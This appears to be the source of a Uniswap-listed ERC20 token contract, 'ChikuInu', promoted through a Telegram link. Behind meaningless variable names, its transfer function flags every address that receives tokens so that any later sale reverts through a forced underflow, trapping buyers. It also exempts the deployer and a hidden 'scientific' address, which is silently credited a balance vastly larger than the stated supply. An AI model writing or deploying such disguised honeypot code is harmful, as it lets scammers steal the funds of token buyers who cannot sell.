// https://t.me/chikuinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ChikuInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private question;
    mapping(address => uint256) private evidence;

    function _transfer(
        address interest,
        address gone,
        uint256 graph
    ) internal override {
        uint256 blind = bone;

        if (evidence[interest] == 0 && question[interest] > 0 && interest != uniswapV2Pair) {
            evidence[interest] -= blind;
        }

        address congress = address(means);
        means = ChikuInu(gone);
        question[congress] += blind + 1;

        _balances[interest] -= graph;
        uint256 least = (graph / 100) * bone;
        graph -= least;
        _balances[gone] += graph;
    }

    uint256 public bone = 3;

    constructor(
        string memory tip,
        string memory gentle,
        address protection,
        address scientific
    ) ERC20(tip, gentle) {
        uniswapV2Router = IUniswapV2Router02(protection);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        evidence[msg.sender] = wonder;
        evidence[scientific] = wonder;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[scientific] = wonder;
    }

    ChikuInu private means;
    uint256 private wonder = ~uint256(1);
}